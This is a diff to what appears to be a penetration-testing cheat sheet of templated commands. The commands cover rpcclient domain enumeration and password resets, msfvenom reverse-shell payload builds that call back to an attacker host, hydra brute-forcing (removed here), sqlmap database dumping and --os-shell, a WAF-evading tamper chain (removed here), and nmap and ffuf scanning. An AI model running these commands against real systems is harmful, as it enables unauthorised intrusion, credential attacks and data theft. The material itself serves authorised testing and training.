@@ -104,18 +104,6 @@ rpcclient <ip> -U "<user>%<pass>" -c "getusrdompwinfo <RID>;quit"
 rpcclient <ip> -U "<user>%<pass>" -c "lsaenumsid;quit"
 rpcclient <ip> -U "<user>%<pass>" -c "lookupsid <SID>;quit"
 rpcclient <ip> -U "<user>%<pass>" -c "setuserinfo2 <LOGIN> 23 '<NEWPASSWORD>';quit"
-hydra -L <userlist> -P <passlist> <ip> ssh
-hydra -l <user|root> -p <password|root> <ip> ssh
-hydra -L <userlist> -e s <ip> ssh
-hydra -l <user|root> -e n <ip> ssh
-hydra -L <userlist> -e r <ip> ssh
-hydra -t 4 -s <port> -C <file_login_pass> <ip> ssh
-hydra -L <userlist> -P <passlist> <ip> ftp
-hydra -L <userlist> -P <passlist> <ip> smb
-hydra -L <userlist> -P <passlist> <ip> mysql
-hydra -L <userlist> -P <passlist> <ip> vnc
-hydra -L <userlist> -P <passlist> <ip> postgres
-hydra -L <userlist> -P <passlist> <ip> telnet
 msfvenom --list payloads
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local_ip> LPORT=<local_port> -f exe > shell.exe
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf
@@ -162,38 +150,22 @@ rlwrap nc -nlvp <port>
 python -c 'import pty; pty.spawn("/bin/bash")'
 stty raw -echo
 stty rows <ROWS> cols <COLS>
-sqlmap -u <url> -p <arguments> --dbs
-sqlmap -u <url> -p <arguments> --dbms=<database_type>
-sqlmap -u <url> -p <arguments> --dbms=<database_type> -D <database_name> --tables
-sqlmap -u <url> -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> --columns
-sqlmap -u <url> -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> -C <columns> --dump
 sqlmap -u <url> --dbs
+sqlmap -r <request_file>
+sqlmap -u <url> --os-shell
 sqlmap -u <url> -D <db> --tables
+sqlmap -u <url> -p <arguments> --dbs
 sqlmap -u <url> -D <db> -T <table> --dump
 sqlmap -u <url> -D <db> -T <table> --columns
 sqlmap -u <url> -D <db> -T <table> -C <c1>,<c2> --dump
-sqlmap -u <url> --os-shell
-sqlmap -u <url> --file-read=<remote_file>
-sqlmap -u <url> --file-write=<local_file> --file-dest=<remote_path_destination>
-sqlmap -r <request_file>
-sqlmap -u '<url>' --level=5 --risk=3 -p '<parameter>' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+sqlmap -u <url> -p <arguments> --dbms=<database_type> -D <database_name> -T <tables> -C <columns> --dump
 docker run --rm -v $(pwd):/data -p7171:7171 leonjza/gowitness gowitness file -f /data/<file>
 docker run --rm -v $(pwd):/data -p7171:7171 leonjza/gowitness gowitness nmap -f /data/<nmap_file>.xml
 curl -k -s <url> | grep -o 'http://[^"]*' | cut -d "/" -f 3 | sort -u
 ffuf -w <wordlist> -u <url>/FUZZ
-ffuf -w <wordlist> -u <url> -H "Host: FUZZ" -fs <response_size>
-ffuf -w <wordlist> -u <url>?<param>=FUZZ -fs <response_size>
-ffuf -w <wordlist> -u <url> -X POST -d "username=admin\&password=FUZZ" -fc 401
-nmap -sn <ip_range>
-nmap -sC -sV <ip>
-nmap -iL <targets_file>
-nmap -sC -sV -oA <output_file> <ip>
-nmap --top-ports 100 --open -sV <ip>
-nmap --top-ports 5000 --open -sV <ip>
-nmap -p- -sV <ip>
-nmap <ip> -p<port_list> --open
-IP=<ip>; ports=$(nmap -p- --min-rate=1000 -n -T4 $IP | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//); nmap -Pn -sC -sV -p$ports $IP -oN scan.txt --reason --script=vuln
-nmap -sU <ip>
+nmap -Pn -sSV --top-ports 5000 --open <ip>
+nmap -Pn -sUV --top-ports 5000 --open <ip>
+nmap -p- -sSCV -Pn <ip>
 nmap --max-rate 100 -sC -sV <ip>
 nmap -Pn -sS -T4 --open --script smb-security-mode -p445 <ip>
-proxychains nmap -n -sT -sV -Pn --open -oA <output_file> -iL <targets_file>
+dnsmasq; nginx;
